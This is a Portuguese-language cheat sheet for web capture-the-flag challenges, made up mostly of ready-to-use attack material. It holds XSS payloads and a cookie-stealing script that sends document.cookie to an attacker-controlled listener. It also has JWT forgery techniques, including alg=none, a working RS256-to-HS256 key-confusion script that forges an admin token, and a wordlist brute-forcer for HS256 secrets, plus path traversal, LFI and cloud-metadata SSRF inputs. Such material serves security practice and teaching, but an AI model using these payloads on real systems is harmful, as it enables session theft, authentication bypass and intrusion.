# XSS e JWT — cheat sheet

## XSS — payloads básicos de teste
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
```
Se `<script>` for filtrado, tente eventos (`onerror`, `onload`, `onfocus`) ou tags alternativas (`<svg>`, `<img>`, `<body onload=...>`).

Para roubar cookie / exfiltrar (precisa de um listener seu, ex. `requestbin` ou `webhook.site`):
```html
<script>fetch('https://SEU_LISTENER/?c='+document.cookie)</script>
```

## JWT (JSON Web Token)
Estrutura: `header.payload.signature` (cada parte em base64url).

1. **Decodificar** — cole em https://jwt.io ou:
   ```python
   import base64, json
   def decode_jwt_part(p):
       p += "=" * (-len(p) % 4)
       return json.loads(base64.urlsafe_b64decode(p))
   ```

2. **alg=none** — muitas libs antigas aceitam um token sem assinatura:
   - Troque `"alg":"HS256"` por `"alg":"none"` no header
   - Apague a assinatura, deixando `header.payload.` (ponto final sem nada depois)

3. **Confusão RS256 → HS256** — se o servidor usa chave pública RSA para verificar, e você consegue forjar um HS256 assinado com essa chave pública como "segredo", a verificação pode aceitar:
   ```bash
   # com a chave pública do servidor em public.pem
   python3 -c "
import jwt
pub = open('public.pem','rb').read()
print(jwt.encode({'user':'admin'}, pub, algorithm='HS256'))"
   ```
   (precisa de `pip install pyjwt`)

4. **Chave fraca (HS256)** — tente quebrar por wordlist:
   ```bash
   python3 -c "
import jwt, itertools
token = 'SEU_TOKEN_AQUI'
for w in open('/usr/share/wordlists/rockyou.txt', errors='ignore'):
    w=w.strip()
    try:
        jwt.decode(token, w, algorithms=['HS256']); print('chave:', w); break
    except Exception: pass"
   ```
   Ou use `jwt_tool`/`hashcat -m 16500`.

## Outros vetores comuns de CTF web
- **Path traversal / LFI**: `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`
- **SSRF**: tente apontar parâmetros de URL para `http://localhost`, `http://127.0.0.1`, `http://169.254.169.254/` (metadata de cloud)
- **Insecure Direct Object Reference (IDOR)**: troque IDs na URL (`?id=5` → `?id=6`)
- **Cookies/headers**: inspecione sempre `Set-Cookie`, `X-`, e cabeçalhos customizados — muitas flags ficam escondidas ali
- Sempre olhe o código-fonte (`Ctrl+U`), comentários HTML, `robots.txt`, `/.git/`, `/admin`, `console` do navegador
